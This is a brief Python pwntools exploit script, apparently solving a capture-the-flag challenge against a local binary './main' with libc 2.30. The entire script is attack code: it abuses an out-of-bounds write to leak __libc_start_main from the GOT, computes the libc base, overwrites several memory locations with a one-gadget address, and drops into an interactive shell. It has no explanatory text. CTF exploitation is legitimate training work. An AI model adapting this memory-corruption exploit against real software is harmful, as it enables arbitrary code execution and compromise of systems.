from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('Exit',str(ch))
def leak(content):
	menu(1)
	p.sendafter('Content:',content)
def write(idx,content):
	menu(2)
	p.sendafter('Content:',content)
	p.sendlineafter('ID',str(idx))
def exit(content):
	menu(3)
	p.sendafter('Content:',content)
def edit(offset,content):
	for i in range(len(content)):
		tmp = ord(content[i])
		if tmp:
			write(offset + i,'U'*tmp)
		else:
			write(offset + i,'U'*0x100)
p = process('./main')
elf =ELF('./main')
libc =ELF('./libc-2.30.so')
edit(-6032,p64(elf.got['__libc_start_main']))
leak('FMYY')
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))

edit(0xD8,p64(0x67F8B0))
edit(0x88,p64(elf.bss() + 0x1000))
edit(0x100 + 0x38 ,p64(libc_base + 0xF1207))
edit(-16,p64(0x67F7B0))
menu(4)
p.interactive()
